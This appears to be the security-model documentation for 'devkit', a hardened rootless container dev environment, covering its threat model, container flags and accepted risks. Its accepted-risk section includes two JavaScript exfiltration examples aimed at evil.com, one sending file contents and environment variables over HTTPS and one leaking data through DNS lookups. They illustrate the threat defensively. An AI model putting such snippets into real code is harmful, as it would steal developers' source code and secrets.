# Devkit Security Model

This document describes the security architecture of devkit, including threats that are eliminated, mitigated, and those that remain as accepted risks.

## Threat Model

Devkit is designed to protect against:

1. **Supply-chain attacks** - Malicious code in npm packages, compromised dependencies
2. **0-day exploits** - Unknown vulnerabilities in project dependencies
3. **Malicious repositories** - Running untrusted code from third-party repos
4. **Data exfiltration** - Unauthorized access to host files, credentials, or services
5. **Lateral movement** - Using the dev environment as a pivot to attack other systems

The primary adversary is **malicious code executing inside the container** that attempts to compromise the host system or exfiltrate sensitive data.

---

## Eliminated Risks

These attack vectors are completely blocked by devkit's architecture.

### 1. Direct Host Filesystem Access

| Threat | Protection | Status |
|--------|------------|--------|
| Read host files (`~/.ssh`, `~/.aws`, etc.) | No host mounts by default | **Eliminated** |
| Write to host filesystem | Named volumes only, no host paths | **Eliminated** |
| Access host `/proc`, `/sys` | Not mounted, rootless namespace | **Eliminated** |
| Traverse to host via symlinks | No host mounts to traverse from | **Eliminated** |

**Implementation:**
```
--volume devkit-workspace:/home/developer/workspace:rw  # Named volume, not host path
--volume devkit-home:/home/developer:rw                 # Named volume, not host path
```

Code is cloned via `git clone` inside the container. The container has no knowledge of or access to host filesystem paths.

### 2. Access to Host Localhost Services

| Threat | Protection | Status |
|--------|------------|--------|
| Connect to host databases (PostgreSQL, MySQL, Redis) | Loopback blocked | **Eliminated** |
| Access host web services (localhost:3000, etc.) | Loopback blocked | **Eliminated** |
| Attack host Docker/Podman socket | Not mounted, loopback blocked | **Eliminated** |
| Connect to host SSH agent | Not forwarded, loopback blocked | **Eliminated** |

**Implementation:**
```
--network=slirp4netns:allow_host_loopback=false
```

The container's network namespace cannot route to the host's `127.0.0.1`. Attempts to connect to `localhost` or `127.0.0.1` from inside the container will fail.

### 3. Privilege Escalation via Setuid/Setgid

| Threat | Protection | Status |
|--------|------------|--------|
| Exploit setuid binaries | No-new-privileges flag | **Eliminated** |
| Setgid escalation | No-new-privileges flag | **Eliminated** |
| Capability acquisition | All capabilities dropped | **Eliminated** |

**Implementation:**
```
--security-opt=no-new-privileges:true
--cap-drop=ALL
```

Even if a setuid binary exists in the container, the kernel will ignore the setuid bit. The container starts with zero Linux capabilities and cannot acquire any.

### 4. Persistent Malware in Container

| Threat | Protection | Status |
|--------|------------|--------|
| Trojan installed in system directories | Read-only rootfs | **Eliminated** |
| Modified system binaries | Read-only rootfs | **Eliminated** |
| Cron jobs / systemd services | Read-only rootfs, no init | **Eliminated** |
| Bootkit / rootkit persistence | Read-only rootfs | **Eliminated** |

**Implementation:**
```
--read-only
--tmpfs=/tmp:rw,noexec,nosuid,size=512m
--tmpfs=/run:rw,noexec,nosuid,size=64m
```

The root filesystem is mounted read-only. Writable areas (`/tmp`, `/run`) are tmpfs with `noexec` and `nosuid` flags, preventing execution of dropped binaries.

### 5. External Network Access to Container Services

| Threat | Protection | Status |
|--------|------------|--------|
| Remote attacker connects to SSH | Bound to 127.0.0.1 only | **Eliminated** |
| Remote attacker connects to debug port | Bound to 127.0.0.1 only | **Eliminated** |
| Network scan discovers container | No external port exposure | **Eliminated** |

**Implementation:**
```
--publish 127.0.0.1:2222:22
--publish 127.0.0.1:9229:9229
```

Ports are bound exclusively to the loopback interface. Remote hosts cannot connect to container services, even if they have network access to the host machine.

---

## Mitigated Risks

These attack vectors are significantly reduced but not completely eliminated.

### 1. Container Escape via Kernel Vulnerabilities

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Namespace escape | Rootless containers | User-level access if escaped |
| cgroups vulnerabilities | Rootless + limited capabilities | Reduced attack surface |
| runc/containerd bugs | Rootless, no-new-privileges | User-level access if escaped |

**Why it's mitigated, not eliminated:**

Container isolation depends on kernel features (namespaces, seccomp, cgroups). Historical CVEs include:

| CVE | Description | Devkit Impact |
|-----|-------------|---------------|
| CVE-2024-21626 | runc escape via fd leak | Mitigated by rootless |
| CVE-2022-0492 | cgroups v1 release_agent escape | Mitigated by rootless |
| CVE-2022-0185 | Heap overflow in fs context | Mitigated by dropped caps |
| CVE-2020-15257 | containerd-shim API exposure | Mitigated by rootless |

**Residual risk:** If a kernel-level escape occurs, the attacker gains access as the unprivileged user running Podman. They could then access:
- User's home directory files (`~/.ssh`, `~/.aws`, `~/.gnupg`)
- User's running processes
- User's network connections

**Additional mitigation:** Run devkit inside a VM for hardware-level isolation.

### 2. Resource Exhaustion (DoS)

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Fork bomb | `--pids-limit=512` | Limited to 512 processes |
| Memory exhaustion | `--memory=4g` | Limited to 4GB |
| Disk exhaustion | Named volumes | Can fill volume (container-local) |
| CPU exhaustion | None by default | Can use 100% CPU |

**Implementation:**
```
--memory=4g
--pids-limit=512
```

**Residual risk:** A malicious process can still consume significant CPU and fill the container's workspace volume. This affects only the container and the user's system responsiveness, not system stability.

**Additional mitigation:** Add `--cpus=2` to limit CPU cores.

### 3. Information Disclosure via Debug Port

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Remote debug connection | Bound to 127.0.0.1 | Local processes can connect |
| Debug protocol RCE | Local-only binding | Any local user process can exploit |

**Residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.

**Additional mitigation:** Only enable debug port when actively debugging. Consider adding a flag to disable it by default.

### 4. SSH Server Attack Surface

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| OpenSSH vulnerabilities | Local-only, key-auth only | Local exploitation possible |
| Brute force attacks | Key authentication only | N/A (passwords disabled) |
| Credential theft | Public key only in container | Private key not exposed |

**Residual risk:** OpenSSH vulnerabilities are rare but do occur. A local attacker (or malware on the host) could potentially exploit the SSH server. Impact is limited to container access.

---

## Remaining Risks (Accepted)

These risks remain and require user awareness or additional external controls.

### 1. Outbound Network Data Exfiltration

| Threat | Current State | Impact |
|--------|---------------|--------|
| Send source code to external server | **Allowed** | Code theft |
| Exfiltrate environment variables | **Allowed** | Secret exposure |
| Exfiltrate cloned credentials | **Allowed** | Credential theft |
| C2 (command & control) communication | **Allowed** | Ongoing compromise |

**Why it's allowed:** The container needs network access to:
- Clone git repositories
- Install npm/yarn/pnpm packages
- Fetch remote resources during development

**Attack scenario:**
```javascript
// Malicious code in an npm package
const https = require('https');
const fs = require('fs');

// Steal source code
const code = fs.readFileSync('/home/developer/workspace/src/secret.js');
https.get(`https://evil.com/steal?data=${Buffer.from(code).toString('base64')}`);

// Steal environment variables
https.get(`https://evil.com/steal?env=${Buffer.from(JSON.stringify(process.env)).toString('base64')}`);
```

**Mitigation options:**

1. **Air-gap after setup:**
   ```yaml
   security:
     network_mode: none  # No network after initial clone/install
   ```

2. **Network proxy with allowlist:**
   - Only permit connections to npm registry, GitHub
   - Block all other outbound traffic
   - Requires external firewall/proxy setup

3. **Dependency auditing:**
   - `npm audit` before install
   - Review lockfile changes
   - Use `npm ci` with known-good lockfile

### 2. Supply Chain Attacks Before Container

| Threat | Current State | Impact |
|--------|---------------|--------|
| Compromised base image | **User responsibility** | Full container compromise |
| Malicious git repository | **User responsibility** | Code execution in container |
| npm registry compromise | **User responsibility** | Malicious package execution |
| Typosquatting packages | **User responsibility** | Malicious package execution |

**Why it's accepted:** Devkit cannot verify the legitimacy of:
- Docker/Podman base images
- Git repositories the user chooses to clone
- npm packages the project depends on

**Mitigation options:**

1. **Pin image digests:**
   ```yaml
   dependencies:
     runtime: node@sha256:abc123...  # Immutable reference
   ```

2. **Use verified publishers:**
   - Docker Official Images
   - Signed/verified npm packages

3. **Vendor dependencies:**
   - Commit `node_modules` to repository
   - Use offline mirror of npm registry

### 3. DNS Information Leakage

| Threat | Current State | Impact |
|--------|---------------|--------|
| DNS queries reveal activity | **Allowed** | Privacy leak |
| DNS exfiltration tunnel | **Allowed** | Data exfiltration |

**Why it's accepted:** DNS is required for normal network operation (resolving npm registry, GitHub, etc.).

**Attack scenario:** Malicious code encodes stolen data in DNS queries:
```javascript
const dns = require('dns');
const stolen = Buffer.from('secret').toString('hex');
dns.lookup(`${stolen}.evil.com`, () => {});  // Data exfiltrated via DNS
```

**Mitigation options:**
- Use `network_mode: none` after setup
- Monitor DNS queries at network level
- Use DNS-over-HTTPS with logging

### 4. Timing and Side-Channel Attacks

| Threat | Current State | Impact |
|--------|---------------|--------|
| Spectre/Meltdown | **Kernel dependent** | Cross-container data leak |
| Cache timing attacks | **Allowed** | Cryptographic key extraction |
| Resource timing | **Allowed** | Activity fingerprinting |

**Why it's accepted:** These attacks exploit CPU hardware vulnerabilities that cannot be mitigated purely in software. Container boundaries do not protect against speculative execution attacks.

**Mitigation options:**
- Keep kernel and microcode updated
- Use hardware with mitigations (newer CPUs)
- Run in VM with dedicated CPU cores

### 5. Local User Process Attacks

| Threat | Current State | Impact |
|--------|---------------|--------|
| Other user processes read container data | **Allowed** | Via debug port or shared resources |
| Malware on host connects to container | **Allowed** | Via localhost-bound ports |

**Why it's accepted:** Devkit protects the host from the container, not the container from the host. If the host is already compromised, the container provides no additional security.

**Mitigation options:**
- Ensure host system is secure
- Use multi-user isolation (different Unix user per project)
- Run in dedicated VM

---

## Security Configuration Reference

```yaml
# devkit.yaml - Security settings

security:
  # Network isolation level
  # - none: No network access (air-gapped, maximum security)
  # - restricted: Internet allowed, localhost blocked (default)
  # - full: Full network including localhost (dangerous)
  network_mode: restricted

  # Memory limit (prevents OOM attacks on host)
  memory_limit: 4g

  # Maximum number of processes (prevents fork bombs)
  pids_limit: 512

  # Read-only root filesystem (prevents persistent malware)
  read_only_rootfs: true

  # Drop all Linux capabilities (minimizes kernel attack surface)
  drop_all_capabilities: true

  # Prevent privilege escalation via setuid binaries
  no_new_privileges: true

features:
  # Allow mounting host directories (breaks filesystem isolation)
  allow_mount: false

  # Allow copying files from host (limited exposure)
  allow_copy: false
```

---

## Comparison with Alternatives

| Feature | Devkit | Docker (default) | VM | Bare metal |
|---------|--------|------------------|-----|------------|
| Host filesystem isolation | ✅ Full | ❌ Often mounted | ✅ Full | ❌ None |
| Localhost network isolation | ✅ Blocked | ❌ Accessible | ✅ Separate | ❌ None |
| Privilege escalation prevention | ✅ Hardened | ❌ Default caps | ✅ Separate kernel | ❌ None |
| Kernel-level isolation | ⚠️ Shared kernel | ⚠️ Shared kernel | ✅ Separate kernel | ❌ None |
| Performance | ✅ Native | ✅ Native | ⚠️ Overhead | ✅ Native |
| Resource usage | ✅ Low | ✅ Low | ⚠️ High | ✅ None |

---

## Recommendations by Threat Level

### Standard Development (Trusted Code)
```yaml
security:
  network_mode: restricted
```
Suitable for your own code and well-known dependencies.

### Evaluating Third-Party Code
```yaml
security:
  network_mode: none  # After initial git clone and npm install
```
Run `devkit start`, let it clone and install, then restart with network disabled.

### Running Untrusted Code
1. Use a dedicated VM
2. Snapshot before running
3. Use `network_mode: none`
4. Destroy VM after evaluation

---

## Reporting Security Issues

If you discover a security vulnerability in devkit, please report it by emailing [security contact] rather than opening a public issue.
